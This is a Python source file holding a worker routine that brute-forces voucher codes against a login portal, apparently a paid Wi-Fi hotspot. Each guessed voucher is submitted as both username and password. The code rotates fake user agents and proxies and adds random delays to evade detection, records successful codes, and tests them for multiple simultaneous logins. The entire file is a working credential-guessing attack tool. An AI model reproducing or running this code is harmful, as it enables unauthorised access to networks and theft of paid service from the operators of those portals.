import requests
import random
import time
from user_agents import generate_user_agent
from multi_login import test_multi_login
import config


def worker_mirror(use_proxy, proxy=None, prefix="default"):
    session = requests.Session()

    while not config.stop_event.is_set():
        voucher = config.voucher_queue.get()  # Blocking GET
        if voucher is None:  # sentinel
            config.voucher_queue.task_done()
            break

        with config.lock:
            config.tried_vouchers.setdefault(prefix, set()).add(voucher)

        payload = {
            "username": voucher,
            "password": voucher,
            "dst": "",
            "popup": "true"
        }
        headers = {"User-Agent": generate_user_agent()}

        try:
            r = session.post(
                config.TARGET_URL,
                data=payload,
                headers=headers,
                proxies=proxy if use_proxy else None,
                timeout=config.TIMEOUT
            )

            if "status" in r.text.lower() or "logout" in r.text.lower():
                print(f"[+] SUCCESS: {voucher}")
                with open(f"success_{prefix}.log", "a") as f:
                    f.write(voucher + "\n")

                test_multi_login(voucher, test_count=2, prefix=prefix)

                config.stop_event.set()
                config.voucher_queue.task_done()
                break
            else:
                print(f"[-] Failed: {voucher}")
                with open(f"failed_{prefix}.log", "a") as f:
                    f.write(voucher + "\n")

        except Exception as e:
            print(f"[!] Proxy error {proxy} | {e}")
            if use_proxy:
                with config.lock:
                    if proxy in config.working_proxies:
                        config.working_proxies.remove(proxy)
                    if not config.working_proxies:
                        print("[!] Semua proxy mati.")
                        config.stop_event.set()
                        config.voucher_queue.task_done()
                        break
                if config.working_proxies:
                    proxy = random.choice(config.working_proxies)

        config.voucher_queue.task_done()
        time.sleep(random.uniform(0.5, 2.0))
